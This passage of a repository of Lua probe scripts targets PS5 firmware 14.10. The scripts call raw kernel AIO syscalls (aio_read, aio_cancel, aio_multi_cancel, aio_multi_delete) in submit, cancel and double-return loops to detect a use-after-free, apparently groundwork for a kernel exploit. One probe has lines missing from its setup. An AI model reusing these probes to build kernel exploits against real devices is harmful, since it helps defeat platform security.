    sc_socketpair = 135,
    sc_getpid = 20,
    sc_aio_read = 255,
    sc_aio_write = 256,
    sc_aio_return = 314,
    sc_aio_error = 315,
    sc_aio_cancel = 316,
    sc_aio_multi_wait = 587,
    sc_aio_multi_cancel = 588,
    sc_aio_multi_delete = 589,
})

-- ============================================================
-- PART 1: Figure out how pipe() works on PS5 Lua
-- ============================================================
log("")
log("--- PART 1: pipe creation methods ---")

-- Method A: pipe(fds_ptr) — standard
local fds_a = memory.alloc(8)
memory.write_dword(fds_a, 0xFFFF)
memory.write_dword(fds_a + 4, 0xFFFF)
local pa_ok, pa_ret = pcall(function() return syscall.sc_pipe(fds_a) end)
local pa_rv = pa_ok and pa_ret:tonumber() or -999
local pa_r = memory.read_dword(fds_a):tonumber()
local pa_w = memory.read_dword(fds_a + 4):tonumber()
log(string.format("  pipe(ptr): rv=%d ptr[0]=%d ptr[1]=%d", pa_rv, pa_r, pa_w))

-- On FreeBSD, pipe() returns fds via the pointer. If pa_r and pa_w are
-- still 0xFFFF, the syscall didn't write to them. Check if rv itself has the fd.
if pa_rv >= 0 and pa_r == 0xFFFF then
    log("  pipe didn't write to ptr — rv=" .. pa_rv .. " might be rfd")
    -- The second fd might be in the upper 32 bits or at rv+1
    -- Close rv if it's a valid fd
    pcall(function() syscall.sc_close(pa_rv) end)
end

-- If pipe wrote valid FDs, use them
local pipe_rfd = -1
local pipe_wfd = -1
if pa_r ~= 0xFFFF and pa_r ~= 0 and pa_w ~= 0xFFFF and pa_w ~= 0 then
    pipe_rfd = pa_r
    pipe_wfd = pa_w
    log("  pipe works with ptr! rfd=" .. pipe_rfd .. " wfd=" .. pipe_wfd)
elseif pa_rv >= 3 then
    -- rv is the rfd, but we don't know wfd
    -- On FreeBSD pipe2 the fds go to the pointer, but pipe() puts them in
    -- the return registers (eax=rfd, edx=wfd). The Lua API only gives us eax.
    -- We might have rfd but not wfd.
    log("  pipe rv=" .. pa_rv .. " — might be rfd only, wfd lost")
end

-- Method B: socketpair — uses pointer output on all BSDs
log("")
log("  trying socketpair(AF_UNIX, SOCK_STREAM)...")
local sp_fds = memory.alloc(8)
memory.write_dword(sp_fds, 0xFFFF)
memory.write_dword(sp_fds + 4, 0xFFFF)
local sp_ok, sp_ret = pcall(function()
    return syscall.sc_socketpair(1, 1, 0, sp_fds) -- AF_UNIX=1, SOCK_STREAM=1
end)
local sp_rv = sp_ok and sp_ret:tonumber() or -999
local sp_r = memory.read_dword(sp_fds):tonumber()
local sp_w = memory.read_dword(sp_fds + 4):tonumber()
log(string.format("  socketpair: rv=%d fd[0]=%d fd[1]=%d", sp_rv, sp_r, sp_w))

local sock0 = -1
local sock1 = -1
if sp_rv == 0 and sp_r ~= 0xFFFF and sp_w ~= 0xFFFF then
    sock0 = sp_r
    sock1 = sp_w
    log("  socketpair works! fd0=" .. sock0 .. " fd1=" .. sock1)
end

-- Method C: open /dev/null for a simple fd
log("")
log("  trying /dev/null...")
local dn_ok, dn_ret = pcall(function() return syscall.sc_open("/dev/null", 2) end)
local devnull = dn_ok and dn_ret:tonumber() or -1
log("  /dev/null fd=" .. devnull)

-- ============================================================
-- PART 2: Test aio_read with whatever FDs we have
-- ============================================================
log("")
log("--- PART 2: aio_read test ---")

local AIOCB_SIZE = 256
local test_fd = -1
local write_fd = -1

if sock0 >= 0 then
    test_fd = sock0
    write_fd = sock1
    log("  using socketpair fds: read=" .. test_fd .. " write=" .. write_fd)
elseif pipe_rfd >= 0 then
    test_fd = pipe_rfd
    write_fd = pipe_wfd
    log("  using pipe fds: read=" .. test_fd .. " write=" .. write_fd)
end

if test_fd >= 0 and write_fd >= 0 then
    -- Write data first
    local wbuf = memory.alloc(64)
    for i = 0, 63 do memory.write_byte(wbuf + i, 0x41 + (i % 26)) end
    local w_ok, w_ret = pcall(function() return syscall.sc_write(write_fd, wbuf, 32) end)
    log("  write 32 bytes: " .. (w_ok and "rv=" .. w_ret:tonumber() or "FAIL"))

    -- Build aiocb
    local aiocb = memory.alloc(AIOCB_SIZE)
    local rbuf = memory.alloc(256)
    for i = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(aiocb + i, 0) end
    for i = 0, 255 do memory.write_byte(rbuf + i, 0xDE) end

    memory.write_dword(aiocb + 0, test_fd)
    memory.write_qword(aiocb + 8, 0)           -- offset
    memory.write_qword(aiocb + 16, rbuf)       -- buf
    memory.write_qword(aiocb + 24, 32)         -- nbytes

    log("  submitting aio_read...")
    local ar_ok, ar_ret = pcall(function() return syscall.sc_aio_read(aiocb) end)
    log("  aio_read: " .. (ar_ok and "rv=" .. ar_ret:tonumber() or "ERR: " .. tostring(ar_ret):sub(1, 50)))

    if ar_ok then
        -- Check completion
        local ae_ok, ae_ret = pcall(function() return syscall.sc_aio_error(aiocb) end)
        if ae_ok then log("  aio_error=" .. ae_ret:tonumber()) end

        local aret_ok, aret_ret = pcall(function() return syscall.sc_aio_return(aiocb) end)
        if aret_ok then
            log("  aio_return=" .. aret_ret:tonumber())
            local b0 = memory.read_byte(rbuf):tonumber()
            local b1 = memory.read_byte(rbuf + 1):tonumber()
            log(string.format("  data: 0x%02x 0x%02x (expect 0x41 0x42)", b0, b1))
        end

        -- ============================================================
        -- PART 3: AIO stress with cancel races
        -- ============================================================
        log("")
        log("--- PART 3: aio submit/cancel stress ---")

        local cancel_ok = 0
        local cancel_err = 0
        local double_ret = 0

        for round = 1, 100 do
            -- Refill socket
            if round % 10 == 1 then
                for i = 1, 10 do
                    pcall(function() syscall.sc_write(write_fd, wbuf, 16) end)
                end
            end

            local cb = memory.alloc(AIOCB_SIZE)
            local buf = memory.alloc(64)
            for i = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(cb + i, 0) end
            memory.write_dword(cb, test_fd)
            memory.write_qword(cb + 16, buf)
            memory.write_qword(cb + 24, 16)

            -- Submit
            local s_ok = pcall(function() syscall.sc_aio_read(cb) end)
            if not s_ok then
                cancel_err = cancel_err + 1
            else
                -- Immediately cancel
                local c_ok, c_ret = pcall(function()
                    return syscall.sc_aio_cancel(test_fd, cb)
                end)
                if c_ok then
                    cancel_ok = cancel_ok + 1
                else
                    cancel_err = cancel_err + 1
                end

                -- Collect
                pcall(function() syscall.sc_aio_return(cb) end)

                -- Double collect (UAF test)
                local d_ok, d_ret = pcall(function() return syscall.sc_aio_return(cb) end)
                if d_ok and d_ret:tonumber() >= 0 then
                    double_ret = double_ret + 1
                    if double_ret <= 3 then
                        log("  *** DOUBLE aio_return OK round " .. round .. " rv=" .. d_ret:tonumber())
                    end
                end
            end
        end

        log("  100 rounds: cancel_ok=" .. cancel_ok .. " cancel_err=" .. cancel_err)
        log("  double aio_return: " .. double_ret)
        if double_ret > 0 then
            log("  *** POTENTIAL UAF: aio_return succeeded after cancel+return ***")
        end

        -- ============================================================
        -- PART 4: aio_multi_cancel stress
        -- ============================================================
        log("")
        log("--- PART 4: aio_multi_cancel ---")

        -- Submit a batch of AIOs
        local batch_cbs = {}
        for i = 1, 8 do
            pcall(function() syscall.sc_write(write_fd, wbuf, 16) end)

            local cb2 = memory.alloc(AIOCB_SIZE)
            local buf2 = memory.alloc(64)
            for j = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(cb2 + j, 0) end
            memory.write_dword(cb2, test_fd)
            memory.write_qword(cb2 + 16, buf2)
            memory.write_qword(cb2 + 24, 8)

            local s2_ok = pcall(function() syscall.sc_aio_read(cb2) end)
            if s2_ok then
                batch_cbs[#batch_cbs + 1] = cb2
            end
        end
        log("  submitted " .. #batch_cbs .. " AIOs")

        -- Build array for multi_cancel
        local arr = memory.alloc(#batch_cbs * 8 + 8)
        for i, cb in ipairs(batch_cbs) do
            memory.write_qword(arr + (i - 1) * 8, cb)
        end

        local mc_ok, mc_ret = pcall(function()
            return syscall.sc_aio_multi_cancel(arr, #batch_cbs, 0, 0, 0, 0)
        end)
        log("  aio_multi_cancel: " ..
            (mc_ok and "rv=" .. mc_ret:tonumber() or "ERR: " .. tostring(mc_ret):sub(1, 50)))

        -- Collect all
        for i, cb in ipairs(batch_cbs) do
            local r2_ok, r2_ret = pcall(function() return syscall.sc_aio_return(cb) end)
            if r2_ok then
                log("    aio[" .. i .. "] return=" .. r2_ret:tonumber())
            end
        end

        -- ============================================================
        -- PART 5: aio_multi_delete after cancel (Lapse variant)
        -- ============================================================
        log("")
        log("--- PART 5: aio_multi_delete ---")

        -- Submit one more
        pcall(function() syscall.sc_write(write_fd, wbuf, 16) end)
        local dcb = memory.alloc(AIOCB_SIZE)
        local dbuf = memory.alloc(64)
        for i = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(dcb + i, 0) end
        memory.write_dword(dcb, test_fd)
        memory.write_qword(dcb + 16, dbuf)
        memory.write_qword(dcb + 24, 8)

        pcall(function() syscall.sc_aio_read(dcb) end)

        -- Cancel it
        pcall(function() syscall.sc_aio_cancel(test_fd, dcb) end)

        -- Now try aio_multi_delete on the cancelled/completed AIO
        local darr = memory.alloc(8)
        memory.write_qword(darr, dcb)
        local md_ok, md_ret = pcall(function()
            return syscall.sc_aio_multi_delete(darr, 1, 0, 0, 0, 0)
        end)
        log("  aio_multi_delete: " ..
            (md_ok and "rv=" .. md_ret:tonumber() or "ERR: " .. tostring(md_ret):sub(1, 50)))

        -- Try return after delete (should fail)
        local pd_ok, pd_ret = pcall(function() return syscall.sc_aio_return(dcb) end)
        log("  aio_return after delete: " ..
            (pd_ok and "rv=" .. pd_ret:tonumber() or "ERR"))
        if pd_ok and pd_ret:tonumber() >= 0 then
            log("  *** aio_return after delete succeeded! ***")
        end
    end
else
    -- No bidirectional FDs available — try aio_read on /dev/null
    log("  no socketpair/pipe available")
    if devnull >= 0 then
        log("  trying aio_read on /dev/null (fd=" .. devnull .. ")...")
        local aiocb = memory.alloc(AIOCB_SIZE)
        local rbuf = memory.alloc(256)
        for i = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(aiocb + i, 0) end
        memory.write_dword(aiocb, devnull)
        memory.write_qword(aiocb + 16, rbuf)
        memory.write_qword(aiocb + 24, 32)

        local dn_aio_ok, dn_aio_ret = pcall(function() return syscall.sc_aio_read(aiocb) end)
        log("  aio_read(/dev/null): " ..
            (dn_aio_ok and "rv=" .. dn_aio_ret:tonumber() or "ERR: " .. tostring(dn_aio_ret):sub(1, 50)))
    end
end

-- Cleanup
if sock0 >= 0 then pcall(function() syscall.sc_close(sock0) end) end
if sock1 >= 0 then pcall(function() syscall.sc_close(sock1) end) end
if pipe_rfd >= 0 then pcall(function() syscall.sc_close(pipe_rfd) end) end
if pipe_wfd >= 0 then pcall(function() syscall.sc_close(pipe_wfd) end) end
if devnull >= 0 then pcall(function() syscall.sc_close(devnull) end) end

log("")
log("=== AIO PIPES FIX DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase2_kernel_objects/19d_aio_minimal.lua

```lua
-- 14.10 Recon Probe 19d: Minimal AIO test
-- aio_read crashes with standard aiocb layout
-- Hypotheses:
-- 1. PS5 aiocb is a different size/layout (Sony modifications)
-- 2. aio_read needs specific sigevent setup (SIGEV_NONE=0 should work)
-- 3. The _aiocb_private field needs initialization
-- Test: try different struct sizes and field offsets

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: AIO MINIMAL ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_close = 6,
    sc_write = 4,
    sc_socketpair = 135,
    sc_getpid = 20,
    sc_aio_read = 255,
    sc_aio_error = 315,
    sc_aio_return = 314,
    sc_aio_cancel = 316,
})

-- Create socketpair
local sp = memory.alloc(8)
syscall.sc_socketpair(1, 1, 0, sp)
local fd0 = memory.read_dword(sp):tonumber()
local fd1 = memory.read_dword(sp + 4):tonumber()
log("socketpair: " .. fd0 .. ", " .. fd1)

-- Write data
local wbuf = memory.alloc(64)
for i = 0, 63 do memory.write_byte(wbuf + i, 0x41) end
syscall.sc_write(fd1, wbuf, 32)
log("wrote 32 bytes")

-- ============================================================
-- PART 1: Test aio_cancel with fd-only (no aiocb needed)
-- aio_cancel(fd, NULL) — should be safe
-- ============================================================
log("")
log("--- PART 1: aio_cancel(fd, NULL) ---")

local ac_ok, ac_ret = pcall(function()
    return syscall.sc_aio_cancel(fd0, 0)
end)
log("  aio_cancel(fd0, 0): " ..
    (ac_ok and "rv=" .. ac_ret:tonumber() or "CRASH"))

-- ============================================================
-- PART 2: Try different aiocb sizes
-- The crash might be because aio_read does copyin() of a
-- specific struct size and our buffer alignment is wrong
-- ============================================================
log("")
log("--- PART 2: aiocb layout probing ---")

-- FreeBSD struct sigevent is 32 bytes on amd64:
--   int sigev_notify;        // +0 (4)
--   int sigev_signo;         // +4 (4)
--   union sigval sigev_value; // +8 (8, pointer-sized)
--   union {                  // +16
--     int _threadid;
--     struct { ... } _kevent_flags;
--     long __spare__[8];     // 64 bytes
--   }
-- So sigevent is actually 80 bytes on FreeBSD! Not 32.
--
-- struct aiocb layout on FreeBSD amd64:
--   +0:  int aio_fildes (4)
--   +4:  padding (4)
--   +8:  off_t aio_offset (8)
--   +16: volatile void* aio_buf (8)
--   +24: size_t aio_nbytes (8)
--   +32: int __spare__[2] (8)  -- or aio_reqprio + padding
--   +40: struct sigevent aio_sigevent (80)
--   +120: int aio_lio_opcode (4)
--   +124: int aio_reqprio (4)  -- might be here instead
--   +128: struct __aiocb_private (40?)
--   Total ~168 bytes

-- Let me try with a huge buffer and carefully set SIGEV_NONE
local SIZES = {168, 176, 192, 200, 208, 224, 256, 320, 512}

for _, sz in ipairs(SIZES) do
    local cb = memory.alloc(sz + 64) -- extra padding
    local rbuf = memory.alloc(256)

    -- Zero EVERYTHING including padding
    for i = 0, sz + 63, 8 do
        memory.write_qword(cb + i, 0)
    end

    -- Standard FreeBSD layout
    memory.write_dword(cb + 0, fd0)         -- aio_fildes
    -- +4: padding = 0
    memory.write_qword(cb + 8, 0)           -- aio_offset = 0
    memory.write_qword(cb + 16, rbuf)       -- aio_buf
    memory.write_qword(cb + 24, 16)         -- aio_nbytes
    -- +32: spare/reqprio = 0
    -- +40: sigevent.sigev_notify = SIGEV_NONE (0)
    memory.write_dword(cb + 40, 0)          -- SIGEV_NONE

    local ok, ret = pcall(function()
        return syscall.sc_aio_read(cb)
    end)

    if ok then
        log(string.format("  size=%d: OK rv=%d", sz, ret:tonumber()))
        -- Check if read completed
        local b0 = memory.read_byte(rbuf):tonumber()
        log(string.format("    data[0]=0x%02x", b0))
        pcall(function() syscall.sc_aio_return(cb) end)
        break
    else
        log(string.format("  size=%d: CRASH — %s", sz, tostring(ret):sub(1, 40)))
        -- If it crashed, the loader might be dead
        -- Try to detect if we're still alive
        local alive = pcall(function() syscall.sc_getpid() end)
        if not alive then
            log("  LOADER DEAD")
            break
        end
    end
end

-- ============================================================
-- PART 3: Alternative — try with aio_buf as offset in the
-- aiocb itself (self-referential) to avoid bad pointer
-- ============================================================
log("")
log("--- PART 3: self-referential aiocb ---")

local cb3 = memory.alloc(512)
for i = 0, 511, 8 do memory.write_qword(cb3 + i, 0) end

-- Put read buffer at end of same allocation
local rbuf3 = cb3 + 256
memory.write_dword(cb3, fd0)
memory.write_qword(cb3 + 8, 0)
memory.write_qword(cb3 + 16, rbuf3)
memory.write_qword(cb3 + 24, 16)

local ok3, ret3 = pcall(function() return syscall.sc_aio_read(cb3) end)
log("  aio_read: " .. (ok3 and "rv=" .. ret3:tonumber() or "CRASH"))

-- ============================================================
-- PART 4: Try aio_error/aio_return with NULL (just to see what happens)
-- These take a single aiocb pointer
-- ============================================================
log("")
log("--- PART 4: aio_error/return with dummy ---")

local dcb = memory.alloc(512)
for i = 0, 511, 8 do memory.write_qword(dcb + i, 0) end

local ae_ok, ae_ret = pcall(function() return syscall.sc_aio_error(dcb) end)
log("  aio_error(zeroed): " ..
    (ae_ok and "rv=" .. ae_ret:tonumber() or "ERR: " .. tostring(ae_ret):sub(1, 40)))

local ar_ok, ar_ret = pcall(function() return syscall.sc_aio_return(dcb) end)
log("  aio_return(zeroed): " ..
    (ar_ok and "rv=" .. ar_ret:tonumber() or "ERR: " .. tostring(ar_ret):sub(1, 40)))

-- Cleanup
pcall(function() syscall.sc_close(fd0) end)
pcall(function() syscall.sc_close(fd1) end)

log("")
log("=== AIO MINIMAL DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase2_kernel_objects/19e_aio_nocrash.lua

```lua
-- 14.10 Recon Probe 19e: AIO without passing zeros
-- CRITICAL: Passing 0/NULL to syscalls crashes the Lua loader!
-- Must pass valid pointers for ALL arguments

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: AIO NOCRASH ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_close = 6,
    sc_write = 4,
    sc_socketpair = 135,
    sc_getpid = 20,
    sc_aio_read = 255,
    sc_aio_error = 315,
    sc_aio_return = 314,
    sc_aio_cancel = 316,
    sc_aio_multi_wait = 587,
    sc_aio_multi_cancel = 588,
    sc_aio_multi_delete = 589,
})

-- Create socketpair
local sp = memory.alloc(8)
syscall.sc_socketpair(1, 1, 0, sp)
local fd0 = memory.read_dword(sp):tonumber()
local fd1 = memory.read_dword(sp + 4):tonumber()
log("socketpair: " .. fd0 .. ", " .. fd1)

-- Write data
local wbuf = memory.alloc(64)
for i = 0, 63 do memory.write_byte(wbuf + i, 0x41) end
syscall.sc_write(fd1, wbuf, 32)
log("wrote 32 bytes")

-- ============================================================
-- PART 1: aio_error and aio_return with valid pointer
-- These take just (struct aiocb*) — single argument
-- ============================================================
log("")
log("--- PART 1: aio_error / aio_return (single ptr) ---")

local cb1 = memory.alloc(512)
for i = 0, 511, 8 do memory.write_qword(cb1 + i, 0) end

local ae_ok, ae_ret = pcall(function() return syscall.sc_aio_error(cb1) end)
log("  aio_error(zeroed_aiocb): " ..
    (ae_ok and "rv=" .. ae_ret:tonumber() or "ERR: " .. tostring(ae_ret):sub(1, 50)))

local ar_ok, ar_ret = pcall(function() return syscall.sc_aio_return(cb1) end)
log("  aio_return(zeroed_aiocb): " ..
    (ar_ok and "rv=" .. ar_ret:tonumber() or "ERR: " .. tostring(ar_ret):sub(1, 50)))

-- ============================================================
-- PART 2: aio_cancel with valid aiocb pointer (not NULL)
-- aio_cancel(int fd, struct aiocb *aiocbp)
-- Pass our zeroed aiocb as second arg instead of 0
-- ============================================================
log("")
log("--- PART 2: aio_cancel(fd, valid_ptr) ---")

local ac_ok, ac_ret = pcall(function()
    return syscall.sc_aio_cancel(fd0, cb1)
end)
log("  aio_cancel(fd0, cb1): " ..
    (ac_ok and "rv=" .. ac_ret:tonumber() or "ERR: " .. tostring(ac_ret):sub(1, 50)))

-- ============================================================
-- PART 3: aio_read with valid struct
-- Key: EVERY field must be valid, no zeros for pointers
-- ============================================================
log("")
log("--- PART 3: aio_read ---")

local aiocb = memory.alloc(512)
local rbuf = memory.alloc(256)
for i = 0, 511, 8 do memory.write_qword(aiocb + i, 0) end
for i = 0, 255 do memory.write_byte(rbuf + i, 0xDE) end

-- Fill struct aiocb — standard FreeBSD amd64 layout:
-- +0:  int aio_fildes (4)
-- +4:  padding (4)
-- +8:  off_t aio_offset (8)
-- +16: volatile void* aio_buf (8)
-- +24: size_t aio_nbytes (8)
-- +32: int __spare__[2] (8) [reserved, must be 0]
-- +40: struct sigevent aio_sigevent (80 bytes on FreeBSD)
--   +40: int sigev_notify = 0 (SIGEV_NONE)
--   +44: int sigev_signo = 0
--   +48: union sigval = 0
--   +56..+119: union (pad)
-- +120: int aio_lio_opcode = 0 (LIO_READ)
-- +124: int aio_reqprio = 0
-- +128: struct __aiocb_private _aiocb_private (40 bytes)
--   +128: long status = 0
--   +136: long error = 0
--   +144: void* kernelinfo = 0
-- Total: ~168 bytes

memory.write_dword(aiocb + 0, fd0)      -- aio_fildes
memory.write_qword(aiocb + 8, 0)        -- aio_offset = 0 (ignored for sockets)
memory.write_qword(aiocb + 16, rbuf)    -- aio_buf = valid buffer
memory.write_qword(aiocb + 24, 16)      -- aio_nbytes = 16
-- sigevent at +40: SIGEV_NONE=0, already zero

log("  aiocb at " .. string.format("0x%x", aiocb))
log("  rbuf at " .. string.format("0x%x", rbuf))
log("  fd=" .. fd0)

local ar2_ok, ar2_ret = pcall(function()
    return syscall.sc_aio_read(aiocb)
end)
log("  aio_read: " ..
    (ar2_ok and "rv=" .. ar2_ret:tonumber() or "CRASH: " .. tostring(ar2_ret):sub(1, 50)))

if ar2_ok then
    log("  *** AIO_READ WORKS! ***")

    -- Check error state
    local e_ok, e_ret = pcall(function() return syscall.sc_aio_error(aiocb) end)
    if e_ok then log("  aio_error=" .. e_ret:tonumber()) end

    -- Get return value
    local r_ok, r_ret = pcall(function() return syscall.sc_aio_return(aiocb) end)
    if r_ok then
        log("  aio_return=" .. r_ret:tonumber())
        if r_ret:tonumber() > 0 then
            local b0 = memory.read_byte(rbuf):tonumber()
            local b1 = memory.read_byte(rbuf + 1):tonumber()
            log(string.format("  data: 0x%02x 0x%02x", b0, b1))
        end
    end
end

-- ============================================================
-- PART 4: Check alive and dump aiocb after aio_read
-- ============================================================
log("")
log("--- PART 4: post-state ---")

local alive_ok = pcall(function() syscall.sc_getpid() end)
log("  still alive: " .. tostring(alive_ok))

-- Dump the aiocb to see what kernel wrote back
if alive_ok then
    log("  aiocb dump:")
    for i = 0, 168 - 1, 8 do
        local lo = memory.read_dword(aiocb + i):tonumber()
        local hi = memory.read_dword(aiocb + i + 4):tonumber()
        if lo ~= 0 or hi ~= 0 then
            log(string.format("    +%3d: 0x%08x%08x", i, hi, lo))
        end
    end
end

-- Cleanup
pcall(function() syscall.sc_close(fd0) end)
pcall(function() syscall.sc_close(fd1) end)

log("")
log("=== AIO NOCRASH DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

```lua
-- 19e proved: aio_error works, aio_return on unsubmitted aiocb crashes
-- This probe: go straight to aio_read, only call aio_return AFTER submit

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

    sc_write = 4,

    sc_getpid = 20,
    sc_aio_read = 255,
    sc_aio_error = 315,
    sc_aio_return = 314,
    sc_aio_cancel = 316,
    sc_aio_multi_wait = 587,
    sc_aio_multi_cancel = 588,
})

-- Create socketpair

syscall.sc_socketpair(1, 1, 0, sp)
local fd0 = memory.read_dword(sp):tonumber()
local fd1 = memory.read_dword(sp + 4):tonumber()
log("socketpair: " .. fd0 .. ", " .. fd1)

-- Write data so aio_read can complete immediately
local wbuf = memory.alloc(64)
for i = 0, 63 do memory.write_byte(wbuf + i, 0x41 + (i % 26)) end
syscall.sc_write(fd1, wbuf, 32)
log("wrote 32 bytes")

-- ============================================================
-- PART 1: aio_read — THE test
-- ============================================================
log("")
log("--- PART 1: aio_read ---")

local aiocb = memory.alloc(512)
local rbuf = memory.alloc(256)

-- Zero everything
for i = 0, 511, 8 do memory.write_qword(aiocb + i, 0) end
for i = 0, 255 do memory.write_byte(rbuf + i, 0xDE) end

-- FreeBSD struct aiocb (amd64)
memory.write_dword(aiocb + 0, fd0)      -- aio_fildes
memory.write_qword(aiocb + 8, 0)        -- aio_offset
memory.write_qword(aiocb + 16, rbuf)    -- aio_buf
memory.write_qword(aiocb + 24, 16)      -- aio_nbytes
-- +40: sigev_notify = SIGEV_NONE = 0 (already zero)

local ar_ok, ar_ret = pcall(function()
    return syscall.sc_aio_read(aiocb)
end)

if ar_ok then
    local rv = ar_ret:tonumber()
    log("  aio_read: rv=" .. rv)

    -- EINPROGRESS = rv of 0 means submitted
    -- rv of -1 means error

    -- Check error
    local e_ok, e_ret = pcall(function() return syscall.sc_aio_error(aiocb) end)
    if e_ok then
        local err = e_ret:tonumber()
        log("  aio_error=" .. err)
        -- EINPROGRESS=36 means still running
        -- 0 means completed
        -- other = actual error

        if err == 0 or err == 36 then
            -- Try aio_return (safe because we submitted)
            local r_ok, r_ret2 = pcall(function() return syscall.sc_aio_return(aiocb) end)
            if r_ok then
                log("  aio_return=" .. r_ret2:tonumber())
                if r_ret2:tonumber() > 0 then
                    local b0 = memory.read_byte(rbuf):tonumber()
                    local b1 = memory.read_byte(rbuf + 1):tonumber()
                    log(string.format("  data: 0x%02x 0x%02x (expect 0x41 0x42)", b0, b1))
                end
            else
                log("  aio_return ERR: " .. tostring(r_ret2):sub(1, 50))
            end
        end
    else
        log("  aio_error ERR: " .. tostring(e_ret):sub(1, 50))
    end

    -- ============================================================
    -- PART 2: Stress test — submit and cancel rapidly
    -- ============================================================
    log("")
    log("--- PART 2: submit/cancel stress ---")

    local ok_count = 0
    local cancel_count = 0
    local double_count = 0

    for round = 1, 100 do
        -- Refill
        if round % 10 == 1 then
            for i = 1, 10 do
                pcall(function() syscall.sc_write(fd1, wbuf, 16) end)
            end
        end

        local cb = memory.alloc(512)
        local buf = memory.alloc(64)
        for i = 0, 511, 8 do memory.write_qword(cb + i, 0) end

        memory.write_dword(cb, fd0)
        memory.write_qword(cb + 16, buf)
        memory.write_qword(cb + 24, 8)

        local s_ok = pcall(function() syscall.sc_aio_read(cb) end)
        if s_ok then
            ok_count = ok_count + 1

            -- Cancel it
            local c_ok, c_rv = pcall(function() return syscall.sc_aio_cancel(fd0, cb) end)
            if c_ok then cancel_count = cancel_count + 1 end

            -- Collect
            pcall(function() syscall.sc_aio_return(cb) end)

            -- Double collect (UAF indicator)
            local d_ok, d_rv = pcall(function() return syscall.sc_aio_return(cb) end)
            if d_ok and d_rv:tonumber() >= 0 then
                double_count = double_count + 1
            end
        end
    end

    log("  submitted=" .. ok_count .. " cancelled=" .. cancel_count)
    log("  double_return=" .. double_count)
    if double_count > 0 then
        log("  *** POTENTIAL UAF ***")
    end

    -- ============================================================
    -- PART 3: aio_multi_cancel stress
    -- ============================================================
    log("")
    log("--- PART 3: aio_multi_cancel ---")

    -- Refill
    for i = 1, 20 do
        pcall(function() syscall.sc_write(fd1, wbuf, 16) end)
    end

    -- Submit batch
    local batch = {}
    for i = 1, 8 do
        local cb2 = memory.alloc(512)
        local buf2 = memory.alloc(64)
        for j = 0, 511, 8 do memory.write_qword(cb2 + j, 0) end
        memory.write_dword(cb2, fd0)
        memory.write_qword(cb2 + 16, buf2)
        memory.write_qword(cb2 + 24, 8)

        local s2_ok = pcall(function() syscall.sc_aio_read(cb2) end)
        if s2_ok then batch[#batch + 1] = cb2 end
    end
    log("  batch submitted: " .. #batch)

    -- Build ptr array — IMPORTANT: no zeros, valid ptrs only
    local arr = memory.alloc(#batch * 8)
    for i, cb in ipairs(batch) do
        memory.write_qword(arr + (i - 1) * 8, cb)
    end

    -- aio_multi_cancel — unknown prototype, try (array, count, ?, ?, ?, ?)
    -- Use 1 instead of 0 for padding args to avoid NULL crash
    local mc_ok, mc_ret = pcall(function()
        return syscall.sc_aio_multi_cancel(arr, #batch, 1, 1, 1, 1)
    end)
    log("  aio_multi_cancel: " ..
        (mc_ok and "rv=" .. mc_ret:tonumber() or "ERR: " .. tostring(mc_ret):sub(1, 50)))

    -- Collect results
    for i, cb in ipairs(batch) do
        local rr_ok, rr_ret = pcall(function() return syscall.sc_aio_return(cb) end)
        if rr_ok then
            log("    aio[" .. i .. "] return=" .. rr_ret:tonumber())
        end
    end

    -- ============================================================
    -- PART 4: Cancel-after-return (classic UAF pattern)
    -- ============================================================
    log("")
    log("--- PART 4: cancel after return ---")

    local uaf_count = 0
    for round = 1, 50 do
        pcall(function() syscall.sc_write(fd1, wbuf, 16) end)

        local cb3 = memory.alloc(512)
        local buf3 = memory.alloc(64)
        for i = 0, 511, 8 do memory.write_qword(cb3 + i, 0) end
        memory.write_dword(cb3, fd0)
        memory.write_qword(cb3 + 16, buf3)
        memory.write_qword(cb3 + 24, 8)

        -- Submit
        pcall(function() syscall.sc_aio_read(cb3) end)
        -- Wait for completion (data in buffer, should complete fast)
        -- Collect
        pcall(function() syscall.sc_aio_return(cb3) end)
        -- Cancel (already completed and returned)
        pcall(function() syscall.sc_aio_cancel(fd0, cb3) end)
        -- Double return
        local dr_ok, dr_ret = pcall(function() return syscall.sc_aio_return(cb3) end)
        if dr_ok and dr_ret:tonumber() >= 0 then
            uaf_count = uaf_count + 1
        end
    end
    log("  50 rounds, double-return: " .. uaf_count)
    if uaf_count > 0 then
        log("  *** UAF CONFIRMED ***")
    end
else
    log("  aio_read CRASHED: " .. tostring(ar_ret):sub(1, 80))
    log("")
    log("  aio_read crashed — checking if alive...")
    local alive = pcall(function() return syscall.sc_getpid() end)
    log("  alive: " .. tostring(alive))

    if alive then
        -- Dump aiocb to see what changed
        log("  aiocb after crash:")
        for i = 0, 167, 8 do
            local lo = memory.read_dword(aiocb + i):tonumber()
            local hi = memory.read_dword(aiocb + i + 4):tonumber()
            if lo ~= 0 or hi ~= 0 then
                log(string.format("    +%3d: 0x%08x%08x", i, hi, lo))
            end
        end
    end
end

-- Cleanup
pcall(function() syscall.sc_close(fd0) end)
pcall(function() syscall.sc_close(fd1) end)

log("")
log("=== AIO READ ONLY DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase2_kernel_objects/19g_aio_debug.lua

```lua
-- 14.10 Recon Probe 19g: Debug why aio_read crashes
-- Every attempt at aio_read kills the loader
-- This probe: test aio_write, test with /dev/null, test alternate syscall nums
-- Also check if the Lua wrapper is the issue vs the kernel

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: AIO DEBUG ===")
log("fw: " .. tostring(FW_VERSION))
